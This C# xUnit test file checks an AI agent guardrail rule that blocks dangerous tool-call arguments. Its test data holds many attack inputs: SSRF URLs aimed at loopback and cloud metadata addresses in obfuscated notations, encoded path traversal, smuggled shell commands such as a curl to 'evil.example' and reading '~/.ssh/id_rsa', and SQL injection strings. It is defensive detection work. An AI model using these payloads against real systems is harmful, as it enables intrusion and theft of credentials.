using System.Globalization;
using AgentGuard.Core.Abstractions;
using AgentGuard.Core.Rules.ToolCall;
using FluentAssertions;
using Xunit;

namespace AgentGuard.Core.Tests.Rules;

public class ToolCallGuardrailRuleDetectionTests
{
    private static GuardrailContext CreateContext(string tool, string argument, string value)
    {
        var context = new GuardrailContext { Text = "", Phase = GuardrailPhase.Output };
        context.Properties[ToolCallGuardrailRule.ToolCallsKey] = new List<AgentToolCall>
        {
            new() { ToolName = tool, Arguments = new Dictionary<string, string> { [argument] = value } }
        };
        return context;
    }

    private static async Task<(GuardrailResult Result, ToolCallViolation? Violation)> EvaluateAsync(
        string value, ToolCallGuardrailRule? rule = null, string tool = "fetch_url", string argument = "url")
    {
        var context = CreateContext(tool, argument, value);
        var result = await (rule ?? new ToolCallGuardrailRule()).EvaluateAsync(context);
        var violation = context.Properties.TryGetValue(ToolCallGuardrailRule.ViolationsKey, out var found)
            ? ((List<ToolCallViolation>)found).Single()
            : null;
        return (result, violation);
    }

    // SSRF: every notation of a loopback, private, link-local or metadata address is the same host

    [Theory]
    [InlineData("http://127.0.0.1?x", "Localhost SSRF")]
    [InlineData("http://localhost#a", "Localhost SSRF")]
    [InlineData("http://2130706433/", "Localhost SSRF")]
    [InlineData("http://0x7f000001/", "Localhost SSRF")]
    [InlineData("http://0177.0.0.1/", "Localhost SSRF")]
    [InlineData("http://127.1/", "Localhost SSRF")]
    [InlineData("http://[::ffff:127.0.0.1]/", "Localhost SSRF")]
    [InlineData("http://[::ffff:7f00:1]/", "Localhost SSRF")]
    [InlineData("http://[::127.0.0.1]/", "Localhost SSRF")]
    [InlineData("http://0.0.0.0/", "Localhost SSRF")]
    [InlineData("http://[::]/", "Localhost SSRF")]
    [InlineData("http://[::1]/", "Localhost SSRF")]
    [InlineData("http://localhost./admin", "Localhost SSRF")]
    [InlineData("http://LOCALHOST:8080/", "Localhost SSRF")]
    [InlineData("http://app.localhost/", "Localhost SSRF")]
    [InlineData("http://evil.example@127.0.0.1/", "Localhost SSRF")]
    [InlineData("http://%31%32%37.0.0.1/", "Localhost SSRF")]
    [InlineData("http:\\\\127.0.0.1\\admin", "Localhost SSRF")]
    [InlineData("http://\uFF4C\uFF4F\uFF43\uFF41\uFF4C\uFF48\uFF4F\uFF53\uFF54/", "Localhost SSRF")]
    [InlineData("gopher://127.0.0.1:6379/_FLUSHALL", "Localhost SSRF")]
    [InlineData("http://10.0.0.5/admin", "Internal network SSRF")]
    [InlineData("http://0x0a000005/", "Internal network SSRF")]
    [InlineData("http://[fd12:3456::1]/", "Internal network SSRF")]
    [InlineData("http://[fe80::1%25eth0]/", "Internal network SSRF")]
    [InlineData("http://[64:ff9b::a00:5]/", "Internal network SSRF")]
    [InlineData("http://169.254.169.254/latest/meta-data/", "Cloud metadata SSRF")]
    [InlineData("http://2852039166/latest/meta-data/", "Cloud metadata SSRF")]
    [InlineData("http://0xa9fea9fe/latest/meta-data/", "Cloud metadata SSRF")]
    [InlineData("http://0251.0376.0251.0376/", "Cloud metadata SSRF")]
    [InlineData("http://169.254.43518/", "Cloud metadata SSRF")]
    [InlineData("http://[::ffff:169.254.169.254]/", "Cloud metadata SSRF")]
    [InlineData("http://[::ffff:a9fe:a9fe]/", "Cloud metadata SSRF")]
    [InlineData("http://[fd00:ec2::254]/latest/meta-data/", "Cloud metadata SSRF")]
    [InlineData("http://metadata.google.internal/computeMetadata/v1/", "Cloud metadata SSRF")]
    [InlineData("http://metadata/computeMetadata/v1/", "Cloud metadata SSRF")]
    [InlineData("http://orders.internal/api", "DNS rebinding via special TLDs")]
    public async Task ShouldBlockSsrf_WhenTheHostIsInternalInAnyNotation(string url, string description)
    {
        var (result, violation) = await EvaluateAsync(url);

        result.IsBlocked.Should().BeTrue(because: $"'{url}' targets an internal host");
        result.Severity.Should().Be(GuardrailSeverity.Critical);
        violation!.Category.Should().Be(ToolCallInjectionCategory.Ssrf);
        violation.Description.Should().Be(description);
    }

    [Theory]
    [InlineData("localhost:6379", "Localhost SSRF")]
    [InlineData("127.0.0.1", "Localhost SSRF")]
    [InlineData("10.1.2.3:8080/metrics", "Internal network SSRF")]
    [InlineData("[::1]:8080", "Localhost SSRF")]
    [InlineData("db.corp:5432", "DNS rebinding via special TLDs")]
    [InlineData("the keys are served from 169.254.169.254 on every VM", "Cloud metadata SSRF")]
    public async Task ShouldBlockSsrf_WhenTheHostHasNoScheme(string value, string description)
    {
        var (result, violation) = await EvaluateAsync(value, argument: "host");

        result.IsBlocked.Should().BeTrue();
        violation!.Description.Should().Be(description);
    }

    [Fact]
    public async Task ShouldBlockSsrf_WhenTheTargetUrlIsPercentEncodedInAParameter()
    {
        var (result, violation) = await EvaluateAsync("https://example.com/redirect?to=http%3A%2F%2F127.0.0.1%2Fadmin");

        result.IsBlocked.Should().BeTrue();
        violation!.Description.Should().Be("Localhost SSRF");
    }

    [Theory]
    [InlineData("https://example.com/api/data")]
    [InlineData("https://1.1.1.1/dns-query")]
    [InlineData("https://api.github.com/repos/filipw/AgentGuard")]
    [InlineData("https://example.com:8080/mirror/127.0.0.1/index.html")]
    [InlineData("https://user@example.com/")]
    [InlineData("https://8.8.8.8/")]
    [InlineData("How do I run my app on localhost?")]
    [InlineData("Version 10.5 of the SDK")]
    [InlineData("the ratio is 3.14")]
    [InlineData("mailto:ops@corp.example.com")]
    public async Task ShouldPass_WhenTheHostIsPublic(string value)
    {
        var (result, _) = await EvaluateAsync(value);

        result.IsBlocked.Should().BeFalse(because: $"'{value}' does not target an internal host");
    }

    // path traversal hidden behind percent-encoding, double encoding, overlong UTF-8 or unusual separators

    [Theory]
    [InlineData("..%2f..%2fetc/passwd")]
    [InlineData("%2e%2e/secrets.txt")]
    [InlineData("%2e%2e%5cwindows%5cwin.ini")]
    [InlineData("%252e%252e%252fsecrets.txt")]
    [InlineData("..%255c..%255cwindows")]
    [InlineData("%c0%ae%c0%ae/secrets.txt")]
    [InlineData("..%c0%afsecrets.txt")]
    [InlineData("files/..%2F..%2Fsecrets.txt")]
    [InlineData("files/%2e%2e")]
    public async Task ShouldBlockTraversal_WhenTheTraversalIsEncoded(string path)
    {
        var (result, violation) = await EvaluateAsync(path, tool: "read_file", argument: "path");

        result.IsBlocked.Should().BeTrue(because: $"'{path}' decodes to a traversal");
        violation!.Category.Should().Be(ToolCallInjectionCategory.PathTraversal);
        violation.Description.Should().Be("Encoded directory traversal");
    }

    [Theory]
    [InlineData("..\\\\..\\\\secrets.txt")]
    [InlineData("../..\\secrets.txt")]
    [InlineData("..//..//secrets.txt")]
    [InlineData("..;/..;/secrets.txt")]
    public async Task ShouldBlockTraversal_WhenSeparatorsAreDoubledOrMixed(string path)
    {
        var (result, violation) = await EvaluateAsync(path, tool: "read_file", argument: "path");

        result.IsBlocked.Should().BeTrue();
        violation!.Description.Should().Be("Directory traversal (../)");
    }

    [Theory]
    [InlineData("image.png\\0.php")]
    [InlineData("image.png\0.php")]
    [InlineData("image.png%2500.php")]
    public async Task ShouldBlockNulByte_WhenItIsWrittenOutOrEncoded(string path)
    {
        var (result, violation) = await EvaluateAsync(path, tool: "read_file", argument: "path");

        result.IsBlocked.Should().BeTrue();
        violation!.Description.Should().Be("Null byte injection");
    }

    // command injection chained with &&, ||, a line break (raw or percent-encoded) or a probe command

    [Theory]
    [InlineData("report.txt && rm -rf /tmp/x")]
    [InlineData("report.txt || curl http://evil.example/x.sh")]
    [InlineData("8.8.8.8\nwhoami")]
    [InlineData("8.8.8.8\r\nid")]
    [InlineData("8.8.8.8\rcat ~/.ssh/id_rsa")]
    [InlineData("8.8.8.8\nls -la")]
    [InlineData("8.8.8.8%0aid")]
    [InlineData("8.8.8.8%0d%0awhoami")]
    [InlineData("x%26%26rm%20-rf%20/tmp/x")]
    [InlineData("x; sleep 10")]
    [InlineData("x | ping -n 20 example.com")]
    [InlineData("name=$(cat /etc/hostname)")]
    [InlineData("name=`whoami`")]
    public async Task ShouldBlockCommandInjection_WhenCommandsAreChained(string value)
    {
        var (result, violation) = await EvaluateAsync(value, tool: "run_diagnostics", argument: "target");

        result.IsBlocked.Should().BeTrue(because: $"'{value}' chains a command");
        violation!.Category.Should().Be(ToolCallInjectionCategory.CommandInjection);
    }

    // SQL tautologies without a leading quote, and encoded ones

    [Theory]
    [InlineData("1 OR 1=1")]
    [InlineData("1 or 1 = 1")]
    [InlineData("1 or true")]
    [InlineData("x' OR 'a'='a")]
    [InlineData("x\" OR \"a\"=\"a\"")]
    [InlineData("1) OR NOT FALSE")]
    [InlineData("1' OR 1 -- -")]
    [InlineData("admin'--")]
    [InlineData("admin' #")]
    [InlineData("1%20OR%201%3D1")]
    public async Task ShouldBlockSqlInjection_WhenTheTautologyIsUnquotedOrEncoded(string value)
    {
        var (result, violation) = await EvaluateAsync(value, tool: "query_db", argument: "filter");

        result.IsBlocked.Should().BeTrue(because: $"'{value}' is a SQL injection");
        violation!.Category.Should().Be(ToolCallInjectionCategory.SqlInjection);
    }

    [Theory]
    [InlineData("EXEC('DROP PROCEDURE p')")]
    [InlineData("EXECUTE sp_executesql @sql")]
    [InlineData("exec master..xp_dirtree '\\\\attacker\\share'")]
    public async Task ShouldBlockSqlExec_WhenAProcedureIsCalled(string value)
    {
        var (result, violation) = await EvaluateAsync(value, tool: "query_db", argument: "sql");

        result.IsBlocked.Should().BeTrue();
        violation!.Category.Should().Be(ToolCallInjectionCategory.SqlInjection);
    }

    // benign arguments that resemble an injection: a comment marker ("C#", a "-- " signature line), a
    // "\0" Windows path segment, the verb "execute", words that are also commands

    [Theory]
    [InlineData("search", "query", "how to use async await in C#")]
    [InlineData("search", "query", "C# vs F#")]
    [InlineData("send_email", "body", "Thanks for the update.\n-- \nJohn Smith\nSenior Engineer")]
    [InlineData("read_file", "path", "C:\\reports\\2024\\03\\summary.pdf")]
    [InlineData("read_file", "path", "C:\\reports\\2024\\03\\")]
    [InlineData("read_file", "path", "C:\\backups\\0\\export.csv")]
    [InlineData("search", "query", "how to execute a python script")]
    [InlineData("search", "query", "exec summary for the board")]
    [InlineData("search", "query", "choose 1 or 2 options")]
    [InlineData("search", "query", "is it true or false")]
    [InlineData("search", "query", "use the '--verbose' flag")]
    [InlineData("send_email", "body", "Dear team,\nFind attached the report.\nCat photos are in the shared drive.")]
    [InlineData("search", "query", "Tom & Jerry cat videos")]
    [InlineData("read_file", "path", "../README.md")]
    [InlineData("fetch_url", "url", "https://example.com/search?q=a%2Fb%20c")]
    [InlineData("sync", "command", "rsync -e ssh backups/ host:/srv/backups")]
    public async Task ShouldPass_WhenTheArgumentIsBenign(string tool, string argument, string value)
    {
        var (result, _) = await EvaluateAsync(value, tool: tool, argument: argument);

        result.IsBlocked.Should().BeFalse(because: $"'{value}' in {tool}.{argument} should not be flagged");
    }

    // matching does not depend on the current culture: under tr-TR "i" and "I" are different letters

    [Fact]
    public async Task ShouldMatchCaseInsensitively_WhenTheCurrentCultureIsTurkish()
    {
        var culture = CultureInfo.CurrentCulture;
        var uiCulture = CultureInfo.CurrentUICulture;
        try
        {
            CultureInfo.CurrentCulture = new CultureInfo("tr-TR");
            CultureInfo.CurrentUICulture = new CultureInfo("tr-TR");

            // patterns are compiled when the rule is built, so it must be built under the culture
            var rule = new ToolCallGuardrailRule();

            (await EvaluateAsync("insert into users values (1)", rule, "query_db", "sql")).Result.IsBlocked.Should().BeTrue();
            (await EvaluateAsync("report.txt; WHOAMI", rule, "run", "target")).Result.IsBlocked.Should().BeTrue();
            (await EvaluateAsync("http://METADATA.GOOGLE.INTERNAL/computeMetadata/v1/", rule)).Violation!
                .Description.Should().Be("Cloud metadata SSRF");
        }
        finally
        {
            CultureInfo.CurrentCulture = culture;
            CultureInfo.CurrentUICulture = uiCulture;
        }
    }
}
